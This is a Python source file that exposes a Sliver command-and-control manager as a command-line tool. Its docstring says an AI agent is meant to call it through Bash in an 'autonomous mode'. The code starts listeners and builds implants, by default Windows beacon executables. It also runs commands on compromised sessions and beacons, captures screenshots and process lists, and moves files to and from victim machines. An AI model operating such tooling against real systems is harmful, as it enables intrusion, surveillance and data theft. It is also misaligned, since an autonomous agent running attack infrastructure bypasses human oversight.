"""C2 tool wrapper — exposes SliverManager operations as a structured
command interface that the agent can invoke via Bash during autonomous mode.

Usage (from Bash inside agent context):
    python3 /home/kali/OffensiveAI/redops/tools.py <command> [args...]

Commands:
    status                              Full C2 status
    listen <proto> [host] [port]        Start a listener
    jobs                                List active listeners
    kill <job_id>                       Kill a listener
    generate <url> [--os X] [--arch X] [--type X] [--format X] [--name X]
    builds                              List implant builds
    sessions                            List active sessions
    beacons                             List active beacons
    exec <session_id> <command>         Execute on session
    task <beacon_id> <command>          Queue on beacon
    screenshot <session_id>             Screenshot from session
    ps <session_id>                     Process list from session
    upload <session_id> <local> <remote>
    download <session_id> <remote>
"""

import sys
import os

# Ensure imports work regardless of cwd
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from sliver_c2 import SliverManager


def main():
    if len(sys.argv) < 2:
        print(__doc__)
        sys.exit(1)

    cmd = sys.argv[1].lower()
    args = sys.argv[2:]
    c2 = SliverManager()

    if cmd == "status":
        # Start connection attempt if daemon is running
        print(c2.full_status())

    elif cmd == "listen":
        if not args:
            print("Usage: listen <mtls|http|https|dns|wg> [host] [port]")
            sys.exit(1)
        proto = args[0]
        host = args[1] if len(args) > 1 else "0.0.0.0"
        port = int(args[2]) if len(args) > 2 else 8443
        print(c2.start_listener(proto, host, port))

    elif cmd == "jobs":
        print(c2.list_jobs())

    elif cmd == "kill":
        if not args:
            print("Usage: kill <job_id>")
            sys.exit(1)
        print(c2.kill_job(int(args[0])))

    elif cmd == "generate":
        if not args:
            print("Usage: generate <proto://host:port> [--os X] [--arch X] [--type X] [--format X] [--name X]")
            sys.exit(1)
        url = args[0]
        opts = {
            "os_target": "windows", "arch": "amd64",
            "implant_type": "beacon", "format": "exe",
            "name": "", "interval": 60, "jitter": 30,
        }
        i = 1
        while i < len(args):
            flag = args[i].lstrip("-")
            val = args[i + 1] if i + 1 < len(args) else ""
            if flag == "os":
                opts["os_target"] = val; i += 2
            elif flag == "arch":
                opts["arch"] = val; i += 2
            elif flag == "type":
                opts["implant_type"] = val; i += 2
            elif flag == "format":
                opts["format"] = val; i += 2
            elif flag == "name":
                opts["name"] = val; i += 2
            elif flag == "interval":
                opts["interval"] = int(val); i += 2
            elif flag == "jitter":
                opts["jitter"] = int(val); i += 2
            else:
                i += 1
        print(c2.generate_implant(url, **opts))

    elif cmd == "builds":
        print(c2.list_implant_builds())

    elif cmd == "sessions":
        print(c2.list_sessions())

    elif cmd == "beacons":
        print(c2.list_beacons())

    elif cmd == "exec":
        if len(args) < 2:
            print("Usage: exec <session_id> <command>")
            sys.exit(1)
        print(c2.interact_session(args[0], " ".join(args[1:])))

    elif cmd == "task":
        if len(args) < 2:
            print("Usage: task <beacon_id> <command>")
            sys.exit(1)
        print(c2.interact_beacon(args[0], " ".join(args[1:])))

    elif cmd == "screenshot":
        if not args:
            print("Usage: screenshot <session_id>")
            sys.exit(1)
        print(c2.session_screenshot(args[0]))

    elif cmd == "ps":
        if not args:
            print("Usage: ps <session_id>")
            sys.exit(1)
        print(c2.session_ps(args[0]))

    elif cmd == "upload":
        if len(args) < 3:
            print("Usage: upload <session_id> <local_path> <remote_path>")
            sys.exit(1)
        print(c2.session_upload(args[0], args[1], args[2]))

    elif cmd == "download":
        if len(args) < 2:
            print("Usage: download <session_id> <remote_path>")
            sys.exit(1)
        print(c2.session_download(args[0], args[1]))

    else:
        print(f"Unknown command: {cmd}")
        print(__doc__)
        sys.exit(1)


if __name__ == "__main__":
    main()
